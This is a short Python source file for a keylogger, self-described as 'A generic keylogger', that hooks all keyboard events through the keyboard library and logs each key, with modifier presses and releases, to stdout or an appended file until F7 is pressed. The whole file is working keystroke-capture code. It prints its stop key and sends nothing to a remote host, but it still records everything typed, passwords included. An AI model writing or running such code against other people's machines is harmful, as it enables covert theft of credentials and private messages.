from functools import partial
import argparse
from sys import stdout

import keyboard

MAP = {
  "space": " ",
  "\r": "\n"
}

# setup argument parser, with arguments --out-file(-o) and --key(-k)
parser = argparse.ArgumentParser(prog="Keylogger", description="A generic keylogger", usage="python main.py")
parser.add_argument('--out-file', '-o', type=argparse.FileType('a'), default=stdout, help="Output to write to, default: stdout")
parser.add_argument('--key', '-k', default="f7", help="Terminate key, default: F7")
args = parser.parse_args()

def callback(output, is_down, event):
  if event.event_type in ("up", "down"):
    key = MAP.get(event.name, event.name)
    modifier = len(key) > 1
    if not modifier and event.event_type == "down": # Capture only modifiers when keys are pressed
      return
    if modifier: # Avoid typing the same key multiple times if it is being pressed
      if event.event_type == "down":
        if is_down.get(key, False):
          return
        is_down[key] = True
      elif event.event_type == "up":
        is_down[key] = False
      key = " [{} ({})] ".format(key, event.event_type) # Indicate if the key is being pressed
    elif key == "\r":
      key = "enter" # Line break
    elif key == " ":
      key = "spacebar"
    output.write(key) # Write the key to the output file
    output.write("\n")
    output.flush and output.flush() # force write

def main():
  print(f"Press {args.key} to terminate")
  try:
    is_down = {} # Indicates if a key is being pressed
    # partial fn as callback and outfile are fixed.
    keyboard.hook(partial(callback, args.out_file, is_down)) # Install the keylogger
    keyboard.wait(args.key) # Run until end key is pressed
  except PermissionError:
    print("File is probably being used by another process")
  except ValueError:
    print("Invalid custom hotkey, try lowercase?")
  keyboard.unhook_all()


if __name__ == "__main__":
  main()
